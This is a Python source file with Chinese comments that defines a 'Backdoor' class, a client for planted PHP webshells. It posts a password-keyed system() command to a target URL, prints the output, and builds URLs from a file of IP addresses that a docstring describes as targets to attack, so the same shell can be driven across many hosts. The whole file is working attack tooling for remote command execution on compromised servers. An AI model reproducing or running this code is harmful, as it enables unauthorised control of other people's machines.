import requests
import re
from urllib.parse import urlparse, parse_qs, urlunparse
from requests.exceptions import RequestException


class Backdoor:
    FileAddress = ''  # 用于保存文件地址
    Url = ''  # 用于保存Url
    scheme = ''  # 协议部分
    netloc = ''  # 域名部分
    path = ''  # 地址部分
    query = ''  # 查询部分
    first_param_name = ''  # 查询键
    first_param_value = ''  # 查询值
    password = ''  # 连接密码
    codeCmd = ''  # 执行代码命令
    systemCmd = ''  # 执行系统命令
    all_IP = []  # 用于保存全部的IP地址
    all_Url = []  # 用于保存全部的Url
    post_data = {}  # post数据

    def printAll(self):
        """
        打印对象的所有属性信息。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `printAll()` 方法来打印对象的所有属性信息。
        """
        print("---------------------属性---------------------")
        print("文件地址属性: ", self.FileAddress)
        print("URL属性: ", self.Url)
        print("协议部分属性: ", self.scheme)
        print("域名部分属性: ", self.netloc)
        print("地址部分属性: ", self.path)
        print("查询部分属性: ", self.query)
        print("查询键属性: ", self.first_param_name)
        print("查询值属性: ", self.first_param_value)
        print("连接密码属性: ", self.password)
        print("代码命令属性: ", self.codeCmd)
        print("POST数据属性：", self.post_data)
        print("系统命令属性：", self.systemCmd)
        print('----------------------------------------------')

    def printALL_IP(self):
        for ip in self.all_IP:
            print(ip)

    def printALL_Url(self):
        for url in self.all_Url:
            print(url)

    def setCodeCmd(self, value=""):
        """
        设置执行命令。

        这个方法用于设置执行命令属性 `cmd` 的值。

        Args:
            value (str, optional): 要设置的执行命令。默认为空字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setcodeCmd()` 方法来设置执行命令属性。
        """
        self.codeCmd = value

    def setPassword(self, value=""):
        """
        设置连接密码。

        这个方法用于设置连接密码属性 `password` 的值。

        Args:
            value (str, optional): 要设置的连接密码。默认为空字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setPassword()` 方法来设置连接密码属性。
        """
        self.password = value

    def setPostValue(self):
        """
        设置POST请求参数。

        这个方法用于设置POST请求的参数，根据对象的 `password` 和 `cmd` 属性来创建参数字典。

        Args:
            None

        Returns:
            dict: 包含POST参数的字典。

        Example:
            示例用法:
            - 调用 `setPostValue()` 方法来创建POST请求的参数字典。
        """
        return {self.password: self.codeCmd}

    def setSystemCmd(self, cmd=""):
        """
        设置执行命令。

        这个方法用于设置执行命令属性 `cmd` 的值，以便执行系统命令。

        Args:
            cmd (str, optional): 要执行的系统命令字符串。默认为空字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setCmd()` 方法并传入要执行的系统命令字符串。
        """
        self.systemCmd = rf'system("{cmd}");'

    def setnetloc(self, netloc):
        try:
            self.netloc = netloc
        except Exception as e:
            print("IP设置错误:", str(e))

    def testUrl(self, Url="", password="admin", cmd="ls -al", automatic="y", timeoutvalue=2):
        """
        测试URL连接并验证密码。

        这个方法用于测试给定的URL连接是否有效，并验证密码是否正确。如果连接成功且密码正确，将保存该URL为模板。

        Args:
            Url (str, optional): 要测试的URL。默认为空字符串。
            password (str, optional): 验证密码。默认为 "admin"。
            cmd (str, optional): 执行命令。默认为 "ls -al"。
            automatic (str, optional): 是否自动执行测试。默认为 "y" 自动。
            timeoutvalue (int, optional): 连接超时时间（秒）。默认为 2 秒。

        Returns:
            None

        Raises:
            RequestException: 如果请求过程中发生错误，将引发此异常。

        Example:
            示例用法:
            - 调用 `testUrl()` 方法来测试连接，并提供要测试的URL和密码。
            - 如果连接成功且密码正确，将保存该URL为模板。
            - 您可以使用不同的参数值来自定义测试行为，例如手动检测、更长的超时时间等。
        """
        self.setSystemCmd(cmd)
        self.setPassword(password)
        self.setCodeCmd(self.systemCmd)
        self.post_data = self.setPostValue()
        try:
            if Url == "":
                self.Url = re.sub(r"\"", "", input("请输入链接： "))
            else:
                self.Url = Url

            # 发送HTTP请求，设置连接超时为2秒
            response = requests.post(
                self.Url, data=self.post_data, timeout=timeoutvalue)

            # 检查响应状态码
            if response.status_code != 200:
                print("连接失败")
            print('---------------------响应---------------------')
            print(response.text)
            print('----------------------------------------------')
            if not response.text:
                print("密码错误")
            if '..' in response.text:
                # 自动检测时响应中包含 ".."则代表成功,否则命令执行失败
                print("连接成功")
            else:
                print("自行检查是否成功")

        # 错误响应
        except RequestException as e:
            if "timeout" in str(e):
                print("连接失败: 失败原因连接时间过长")
            else:
                print("连接失败:", str(e))

    def analyzeUrl(self):
        """
        分析URL，提取各个部分信息。

        这个方法用于解析给定的URL，并提取其各个部分的信息，包括协议、域名、地址、查询参数等。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `analyzeUrl()` 方法来解析URL。
            - 方法将提取URL的协议、域名、地址、查询参数等信息，并将其保存到对象的属性中，以供后续使用。
        """
        if self.Url == "":
            print("先测试Url")
        # 使用urlparse解析Url
        parsed_url = urlparse(self.Url)

        # 提取Url的各个部分
        self.scheme = parsed_url.scheme  # 协议部分
        self.netloc = parsed_url.netloc  # 域名部分
        self.path = parsed_url.path      # 地址部分
        self.query = parsed_url.query    # 查询部分

        # 使用parse_qs解析查询字符串
        query_dict = parse_qs(self.query)

        # 获取查询参数的值
        if query_dict:
            self.first_param_name = list(query_dict.keys())[0]
            self.first_param_value = query_dict[self.first_param_name][0]

    def getFileAddress(self, value=''):
        """
        将从文件中读取IP地址资产。
        这个方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。

        Args:
            value (str, optional): 自定义源地址。默认为空字符串。

        Returns:
            None

        Raises:
            Exception: 如果发生任何异常，将引发 "文件地址获取发生错误" 异常。

        Example:
            示例用法:
            - 创建一个文本文件，写入要攻击的IP地址。
            - 调用 `readFileAddress()` 方法来读取文件地址。
            - 当参数为空时,会自动提醒输入
        """
        try:
            if value == '':
                self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
        except Exception as e:
            print("文件地址获取发生错误", str(e))

    def readAll_IP(self):
        with open(self.FileAddress, mode="r", encoding="utf-8") as f:
            self.all_IP = [line.strip() for line in f.readlines()]

    def spliceUrl(self):
        urls = [
            f"{self.scheme}://{ip}{self.path}?{self.query}"for ip in self.all_IP]
        self.all_Url = urls
